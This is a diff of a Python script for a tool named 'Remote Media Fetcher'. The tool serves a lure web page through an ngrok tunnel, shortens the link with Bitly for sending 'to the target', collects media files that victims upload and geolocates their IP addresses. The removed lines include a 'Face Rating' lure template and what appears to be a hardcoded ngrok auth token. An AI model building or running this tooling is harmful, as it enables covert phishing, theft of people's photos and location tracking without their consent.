@@ -1,93 +1,105 @@
-import os, json, time, subprocess
-from urllib.parse import urlencode
+import os
+import json
+import subprocess
 import requests
+import time
 
-def save_token(token):
-    with open("ngrok.json", "w") as f:
-        json.dump({"token": token}, f)
+NGROK_FILE = 'ngrok.json'
 
-def load_token():
-    if os.path.exists("ngrok.json"):
-        with open("ngrok.json", "r") as f:
-            return json.load(f).get("token")
+def load_ngrok_token():
+    if os.path.exists(NGROK_FILE):
+        with open(NGROK_FILE, 'r') as f:
+            data = json.load(f)
+            return data.get('token')
     return None
 
-def bitly_short(url):
-    try:
-        headers = {'Authorization': 'Bearer YOUR_BITLY_TOKEN'}
-        data = {"long_url": url}
-        r = requests.post("https://api-ssl.bitly.com/v4/shorten", json=data, headers=headers)
-        if r.status_code == 200:
-            return r.json()["link"]
-    except:
-        pass
-    return url
+def save_ngrok_token(token):
+    with open(NGROK_FILE, 'w') as f:
+        json.dump({'token': token}, f)
+
+def start_php_server():
+    print("\n[*] Starting PHP server on http://127.0.0.1:8080 ...")
+    os.system("php -S 127.0.0.1:8080 > /dev/null 2>&1 &")
 
 def start_ngrok():
-    subprocess.Popen(["php", "-S", "127.0.0.1:8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(2)
-    os.system("killall ngrok > /dev/null 2>&1")
-    time.sleep(1)
     subprocess.Popen(["ngrok", "http", "8080"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-    time.sleep(5)
+    time.sleep(3)
     try:
-        tunnel = requests.get("http://127.0.0.1:4040/api/tunnels").json()
-        url = tunnel["tunnels"][0]["public_url"]
-        return url
-    except:
+        response = requests.get("http://127.0.0.1:4040/api/tunnels").json()
+        return response['tunnels'][0]['public_url']
+    except Exception:
         return None
 
-def check_ngrok():
-    return subprocess.call(['which', 'ngrok'], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0
+def shorten_link(long_url):
+    try:
+        bitly_token = "YOUR_BITLY_ACCESS_TOKEN"
+        headers = {'Authorization': f'Bearer {bitly_token}', 'Content-Type': 'application/json'}
+        data = {"long_url": long_url}
+        res = requests.post("https://api-ssl.bitly.com/v4/shorten", headers=headers, json=data)
+        return res.json().get("link", long_url)
+    except:
+        return long_url
 
-def install_ngrok():
-    print("\nInstalling Ngrok...")
-    os.system("pkg install wget -y")
-    os.system("wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip -O ngrok.zip")
-    os.system("unzip ngrok.zip && chmod +x ngrok && mv ngrok /data/data/com.termux/files/usr/bin/")
-    os.system("rm -f ngrok.zip")
-    print("\nNgrok installed successfully.")
+def track_visitors():
+    print("\n[*] Tracking visitors (Press Ctrl + C to stop)...\n")
+    uploaded_dir = os.path.join(os.getcwd(), "uploads")
+    os.makedirs(uploaded_dir, exist_ok=True)
+
+    prev_files = set(os.listdir(uploaded_dir))
+    try:
+        while True:
+            time.sleep(2)
+            new_files = set(os.listdir(uploaded_dir)) - prev_files
+            for file in new_files:
+                print(f"[+] File saved: uploads/{file}")
+            prev_files = set(os.listdir(uploaded_dir))
+
+            log_file = "ip_logs.txt"
+            if os.path.exists(log_file):
+                with open(log_file, 'r') as f:
+                    ips = f.readlines()
+                for ip in ips:
+                    ip = ip.strip()
+                    if ip:
+                        try:
+                            res = requests.get(f"http://ip-api.com/json/{ip}").json()
+                            print(f"\n[+] Visitor IP: {ip}")
+                            for k, v in res.items():
+                                print(f"  {k}: {v}")
+                        except:
+                            print(f"[!] Failed to fetch info for IP: {ip}")
+                os.remove(log_file)
+    except KeyboardInterrupt:
+        print("\n[!] Session ended by user.")
 
 def main():
-    print("\n\033[1;33m[!] Do you want to use Ngrok? (y/n)\033[0m")
-    print("\033[1;32mNgrok allows access from devices not connected to your Wi-Fi or internet.\033[0m")
-    use_ngrok = input("Choice: ").lower()
-    if use_ngrok != 'y':
-        print("\nRunning only on localhost (http://127.0.0.1:8080)\n")
-        subprocess.Popen(["php", "-S", "127.0.0.1:8080"])
-        return
+    print("===================================")
+    print("     RMF | Remote Media Fetcher")
+    print("===================================")
+    print("\n[!] WARNING: TURN ON YOUR HOTSPOT BEFORE STARTING\n")
 
-    if not check_ngrok():
-        print("\n\033[1;31mNgrok is not installed.\033[0m")
-        choice = input("Do you want to install Ngrok now? (y/n): ").lower()
-        if choice == 'y':
-            install_ngrok()
-        else:
-            print("Ngrok is required for public access. Exiting...")
-            return
-
-    print("\n\033[1;31m[!] Turn on your hotspot before continuing!\033[0m\n")
-    token = load_token()
+    token = load_ngrok_token()
     if not token:
-        token = input("Enter your Ngrok auth token (or use this: 2uDpowTCpSNGhcKZDFudAIYVgzY_5eQoEwnb1618PjVwqZJgY): ").strip()
-        save_token(token)
-    os.system(f"ngrok config add-authtoken {token}")
+        token = input("[?] Enter your Ngrok Auth Token: ").strip()
+        save_ngrok_token(token)
+        os.system(f"ngrok config add-authtoken {token}")
 
-    print("\nAvailable templates:\n[1] Face Rating\n")
-    input("Select template [1]: ")
+    print("\n[+] Template selected: index.html (default)")
 
-    print("\nStarting PHP server on http://127.0.0.1:8080 ...")
+    start_php_server()
     ngrok_url = start_ngrok()
     if not ngrok_url:
-        print("Ngrok failed to start.")
+        print("[!] Failed to start Ngrok tunnel")
         return
 
-    print(f"\nLocalhost Link : http://127.0.0.1:8080")
-    print(f"Ngrok Link     : {ngrok_url}")
-    shortened = bitly_short(ngrok_url)
-    print(f"Short Bitly URL: {shortened}")
-    print("\nSend this link to the target.")
-    input("\nPress CTRL+C to exit.\n")
+    print(f"\n[+] Localhost Link: http://127.0.0.1:8080")
+    print(f"[+] Ngrok Link: {ngrok_url}")
+
+    # Optional Bitly Shorten
+    short = shorten_link(ngrok_url)
+    print(f"[+] Shortened Link: {short}")
+
+    track_visitors()
 
 if __name__ == "__main__":
     main()
